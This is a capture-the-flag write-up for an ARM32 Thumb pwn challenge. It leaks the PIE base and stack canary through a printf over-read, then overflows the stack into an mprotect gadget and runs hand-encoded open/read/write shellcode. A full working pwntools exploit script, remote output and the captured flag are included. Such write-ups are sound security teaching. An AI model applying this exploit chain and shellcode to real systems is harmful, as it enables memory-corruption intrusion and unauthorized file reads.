---
title: "PWN#Alpha"
category: "Pwn"
tags: ["arm32", "thumb-2", "stack-buffer-overflow", "canary-leak", "mprotect", "shellcode", "orw"]
solve_date: "2026-10-14T14:00:00+07:00"
language: "en"
points: 170
---

# PWN#Alpha — ARM32 Thumb stack smash to mprotect + ORW

**Flag:** `CTF{3183b60e20b34af6528ff443e52b0445COBE}`  
**Service:** `nc 169.58.126.107 5004`  
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `vault` (ELF32 ARM EABI5, stripped) | 67,244 | `ebada74666f8e1e91ee8994093fd65718ea464c418b5c78d22d00160c6cf09e7` |

## Challenge

> PWN#Alpha — 170 points. Get a shell on the remote host and read the flag.

The handout is a 32-bit ARM (Thumb-2) PIE called `vault`, dynamically linked against
`/lib/ld-linux-armhf.so.3` and stripped. The service prints a debug line containing a code pointer,
asks for a name, greets it back with `printf("Hello, %s\n", buf)`, then reads a second, longer
message into the same stack buffer before printing `Message received.`.

The remote has ASLR disabled: the PIE base is always `0x40000000` and the stack frame address is
constant, but the stack canary changes on every connection, so it has to be leaked fresh each time.

## Analysis

### Protections and imports

`vault` is PIE, Partial RELRO (`.got` at `0x20000` is writable), NX (`GNU_STACK` is `RW`), and it
uses a stack canary (`__stack_chk_guard` / `__stack_chk_fail`). It imports only `read`, `printf`,
`puts`, `setvbuf`, `abort` and `__libc_start_main@GLIBC_2.34` — no `system`, no `execve`. It was
built with GCC `Debian 14.3.0-5` for ARM EABI5, hard-float.

All of `.text` is Thumb-2, so the entry point is the odd address `0x9e1`. Static tools that decode
the file as ARM produce garbage; disassembling `.text` (file offset `0x594`, 1156 bytes) in Thumb
mode is required.

### The vulnerable function at 0x89a

The function reads twice into the same 64-byte stack buffer at `r7+4`:

```text
0x8bc  printf("[debug] build id: %p\n", base+0x945)   <- PIE leak
0x8c8  read(0, r7+4, 0x41)                            <- 65 bytes: one byte past the buffer
0x8d6  printf("Hello, %s\n", r7+4)                    <- %s over-read: canary + saved regs
0x8f2  read(0, r7+4, 0x96)                            <- 150 bytes: full stack smash
0x8fc  puts("Message received.")
```

The frame is: `buf` at `buf+0`, canary at `buf+64`, saved `r7` at `buf+68`, saved return address at
`buf+72`. The second `read` accepts 150 bytes, which is 78 bytes more than needed to reach the
saved link register, and it accepts NUL bytes.

The format strings and prompts live XOR-obfuscated in `.data` (4-byte key `0x91c4ef87`); decoding
them recovers the layout above:

```text
Enter your name:
Leave a message for the vault keeper:
Message received.
[debug] build id: %p
Hello, %s
```

### Leak 1 — PIE base

The debug line prints the address of the code right after the call, `base+0x945`, so
`base = leaked - 0x945`. On the remote it is always `0x40000945`, i.e. `base = 0x40000000`.

### Leak 2 — canary, saved r7, saved lr

The canary's low byte is `0x00`, so a 64-byte name stops `%s` exactly at the canary. Sending 65
bytes overwrites that `0x00` and `%s` keeps printing: the three remaining canary bytes, the saved
`r7` (a stack address) and the low bytes of the saved `lr`, until it hits a NUL. The reply then
ends with:

```text
...AAAAAAAA\xf7\xa9\x98\xe0\xfb\xff?w\t
```

so `canary = 00 f7 a9 98`, `saved r7 = 0x3ffffbe0` and `saved lr = ...0977`
(`0x40000977`). `buf` sits `0x4c` below the saved `r7`, giving `buf = 0x3ffffb94` — constant on
every connection. Because a canary byte may itself be `0x00`, the leak is retried until the marker
`saved_r7 || lr_low` (`e0 fb ff 3f 77 09`) is present.

### Hidden mprotect gadget at 0x9c2

The tail of the binary's obfuscation routine doubles as a usable gadget:

```text
0x9c2  mov  r0, r3
0x9c4  movw r1, #0xf000
0x9c8  movt r1, #0xffff
0x9cc  ands r0, r1          ; r0 = r3 & 0xfffff000  (page-align)
0x9ce  movs r1, #1
0x9d0  lsls r1, r1, #0xc    ; r1 = 0x1000
0x9d2  movs r2, #7          ; r2 = PROT_READ|WRITE|EXEC
0x9d4  movw r7, #0x7d       ; __NR_mprotect (125)
0x9d8  svc  #0
0x9da  add.w r3, r3, #1
0x9de  bx   r3
```

It page-aligns `r3`, calls `mprotect(page, 0x1000, RWX)`, then jumps to `r3+1`. Since `bx` with the
low bit set switches to Thumb state, `r3 = buf` makes it land on `buf` in Thumb mode. That converts
the stack page holding our buffer into executable memory and hands control to shellcode placed at
the very start of the payload — no libc leak needed.

### Why open/read/write instead of a shell

`execve` never worked on this target. With `argv = [filename, NULL]`, `envp = [NULL]`, and later
with a real `envp = ["PATH=/usr/bin:/bin"]`, the syscall returned `-22` (`EINVAL`); a separate probe
with the ARM `execve` number `11` killed the connection outright. Everything else behaved normally —
`write`, `mprotect` and `time` returned sane values, and a bogus syscall number returned `-14`
(`EFAULT`) — so this is not a seccomp filter; the environment simply refuses to `exec`. Since
arbitrary code execution was already achieved, the flag was read directly with
`open`/`read`/`write`.

## Solution

### 1. Leak base, canary and stack

Connect, parse `[debug] build id: 0x...` for the base, send 65 bytes, locate the marker in the
`Hello, ...` blob, then recover `canary = b'\x00' + blob[i-3:i]` and `buf = saved_r7 - 0x4c`.

### 2. Lay out the 150-byte frame

```text
buf+0   .. buf+35   Thumb shellcode (36 bytes, open/read/write)
buf+36  .. buf+39   0x90 filler
buf+40  .. buf+54   "/flag/flag.txt\0"
buf+64  .. buf+67   leaked canary
buf+68  .. buf+71   saved r7 (unused)
buf+72  .. buf+75   base+0x677   pop {r3, pc}
buf+76  .. buf+79   buf           -> r3
buf+80  .. buf+83   base+0x9c3   mprotect gadget (Thumb bit set)
buf+84  .. buf+149  filler
```

The second `read` returns, the epilogue compares the canary, restores `sp` and pops the overwritten
`lr`, and the chain runs.

### 3. Shellcode

The shellcode is hand-encoded Thumb (no cross-`as` or keystone was available on the analysis
machine, so every encoding was brute-forced and verified with capstone). On entry `r3 = buf+1`, so
`add.w r3, r3, #0x27` points `r3` at the path string at `buf+40`:

```text
add.w r3, r3, #0x27   ; r3 = buf+40 (path)
mov   r0, r3
movs  r1, #0
movs  r2, #0
movs  r7, #5          ; open(path, 0, 0)
svc   #0
add.w r1, r3, #40     ; buf+80
movs  r2, #250
movs  r7, #3          ; read(fd, buf+80, 250)  - fd still in r0
svc   #0
movs  r0, #1
add.w r1, r3, #40
movs  r2, #250
movs  r7, #4          ; write(1, buf+80, 250)
svc   #0
```

### 4. Locate the flag

The obvious paths were wrong. `open("/flag")` succeeded (`fd = 5`) but `read` on it returned `-21`
(`EISDIR`) — `/flag` is a directory. A `getdents64` (syscall 217) listing of it returned
`['.', '..', 'flag.txt']`, and `/flag/flag.txt` is the real file.

## Exploit code

```python
#!/usr/bin/env python3
# PWN#Alpha - ARM32 (Thumb) PIE + PartialRELRO + NX + StackCanary, ASLR off.
# Leak:  printf("[debug] build id: %p", code_ptr) -> PIE base
#        printf("Hello, %s", name_buf) -> stack canary (byte0=0x00) + saved r7 -> buf addr
# Primitive: read(0, buf, 0x96) overflows buf -> overwrite saved LR (ret addr) past canary.
# Exec: hidden Thumb gadget mprotects buf's stack page RWX then 'bx r3' jumps into our shellcode.
# Shellcode: open/read/write -> read /flag/flag.txt  (execve kept returning EINVAL in this env)
from pwn import *
from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB
import re
context(arch='arm', os='linux', log_level='error')

_md=Cs(CS_ARCH_ARM,CS_MODE_THUMB)
def b1(h): return bytes([h&0xff,(h>>8)&0xff])
def movs(rd,imm): return b1(0x2000|(rd<<8)|imm)
def mov(a,b): return b1(0x4600|(b<<3)|a)
def str_(rd,rn,off): return b1(0x6000|((off>>2)<<6)|(rn<<3)|rd)
def svc(): return b1(0xdf00)
def addw(rd,rn,imm):
    h1=0xF100|(((imm>>11)&1)<<10)|(rn&0xf)
    h2=(((imm>>8)&7)<<12)|((rd&0xf)<<8)|(imm&0xff)
    return b1(h1)+b1(h2)

HOST,PORT="169.58.126.107",5004
FLAG="/flag/flag.txt"
MARKER=b'\xe0\xfb\xff\x3f\x77\x09'      # constant saved_r7 + saved_lr low bytes (ASLR off)
RET_POP   = 0x676|1                     # pop {r3, pc}
GAD_MPROT = 0x9c2|1                     # mov r0,r3; mprotect(page,0x1000,RWX); add r3,#1; bx r3

def orw_shellcode():
    # r3=buf+1 at entry. open(path@buf+40) ; read(fd, buf+80, 250) ; write(1, buf+80, 250)
    return (addw(3,3,39)
            + mov(0,3) + movs(1,0) + movs(2,0) + movs(7,5) + svc()
            + addw(1,3,40) + movs(2,250) + movs(7,3) + svc()
            + movs(0,1) + addw(1,3,40) + movs(2,250) + movs(7,4) + svc())

def connect_and_leak():
    r=remote(HOST,PORT,timeout=20)
    banner=r.recvuntil(b"Enter your name: ",timeout=10)
    base=int(re.search(rb"0x([0-9a-f]+)",banner).group(1),16)-0x945
    r.send(b"A"*65)                       # overwrite canary[0] so %s leaks canary[1..]+regs
    blob=r.recvuntil(b"vault keeper: ",timeout=10)
    i=blob.find(MARKER)
    if i<3:
        r.close(); return None
    canary=b'\x00'+blob[i-3:i]
    buf=u32(MARKER[0:4])-0x4c             # buffer address (r7 of vuln + 4)
    return r,base,canary,buf

def build_payload(base,buf,canary):
    sc=orw_shellcode(); assert len(sc)<=40
    b=bytearray(b'\x00'*150)
    b[84:150]=b'D'*66
    b[0:len(sc)]=sc
    b[40:40+len(FLAG)+1]=FLAG.encode()+b'\x00'
    b[64:68]=canary
    b[72:76]=p32(base+RET_POP)
    b[76:80]=p32(buf)
    b[80:84]=p32(base+GAD_MPROT)
    return bytes(b)

def main():
    for t in range(1,80):
        got=connect_and_leak()
        if not got: continue
        r,base,canary,buf=got
        r.send(build_payload(base,buf,canary))
        try: r.recvuntil(b"Message received.\n",timeout=5)
        except Exception: pass
        try: d=r.recv(timeout=5)
        except Exception: d=b''
        r.close()
        if d and d[:4]!=b'\xc3\t':
            flag=d.split(b'\n',1)[0].decode(errors='replace')
            print("[+] attempts=%d base=%#x buf=%#x"%(t,base,buf))
            print("[+] FLAG ->",flag)
            return
    print("[-] failed")

if __name__=="__main__":
    main()
```

## Result

Leak behaviour on the remote (65-byte name):

```text
BANNER: b'[debug] build id: 0x40000945\nEnter your name: '
RESP raw: b'Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf7\xa9\x98\xe0\xfb\xff?w\t\nLeave'
```

The bytes after the 65 `A`s are the canary tail `f7 a9 98`, the saved `r7` `e0 fb ff 3f`
(`0x3ffffbe0`), and the low bytes of the saved `lr` `77 09`.

Path discovery. An `open`-only probe that writes the returned fd back:

```text
/bin/sh          open->5
/etc/passwd      open->5
/flag            open->5
/flag.txt        open->-2
```

`/flag` opens, but reading it fails, so it is a directory:

```text
== /flag (tries=0) fd=5 read=-21
files in /flag: ['.', '..', 'flag.txt']
```

Final read of `/flag/flag.txt` (the 250-byte dump is cut after the newline for width; the rest is
the stale `D` padding and stack words that were already in the buffer):

```text
=== /flag/flag.txt ===
b'CTF{3183b60e20b34af6528ff443e52b0445COBE}\nDDDDDDDDDDDDDDDDDDDDDDDDDDDD\x00\x00...'
--- clean ---
CTF{3183b60e20b34af6528ff443e52b0445COBE}
```

Re-run of the consolidated script:

```text
[+] attempts=1 base=0x40000000 buf=0x3ffffb94
[+] FLAG -> CTF{3183b60e20b34af6528ff443e52b0445COBE}
```

The flag file on the remote literally ends with `COBE}` inside the braces; that is the content of
`/flag/flag.txt`, not a transcription artefact.

## Notes

* The 65-byte name read is the whole canary leak: 64 bytes stop `%s` on the canary's `0x00`, one
  extra byte removes that terminator. If bytes 1–3 of the canary contain `0x00` the string ends
  early, `find(MARKER)` fails, and the script has to reconnect for a fresh canary.
* ASLR being off is what makes this a one-shot: base `0x40000000` and `buf` `0x3ffffb94` are fixed.
  The canary is not — it differs per connection, so it is re-leaked every attempt.
* `execve` returns `EINVAL` for every `argv`/`envp` shape that was tried, while `write` and
  `mprotect` work, so it is not seccomp. Do not plan a shell for this target.
* `/flag` is a directory. `open` succeeds and `read` fails with `-21`; `getdents64` (syscall 217)
  reveals `flag.txt`.
* Shellcode is capped at 40 bytes because the path string is stored at `buf+40`. `r3` is `buf+1`
  at entry (the Thumb bit), so `add.w r3, r3, #0x27` reaches `buf+40`, and `read`/`write` use
  `buf+80`.
* There was no ARM cross-`as` and no keystone on the analysis box, so every Thumb instruction was
  encoded by hand and checked against capstone before use; a wrong `add.w`/`movw` encoding silently
  produces a valid-looking but different instruction.
* Pass file paths inside the script, never through `argv` on Git Bash for Windows — `"/bin/sh"` in
  `sys.argv` was rewritten to `C:/Program Files/Git/bin/sh` and made the probes meaningless.
* Both dead ends (`execve` returning `EINVAL`, `/flag` being a directory) first look like empty
  output. An `open`-only probe that echoes the returned fd back separates a bad path from a broken
  shellcode chain in one attempt.
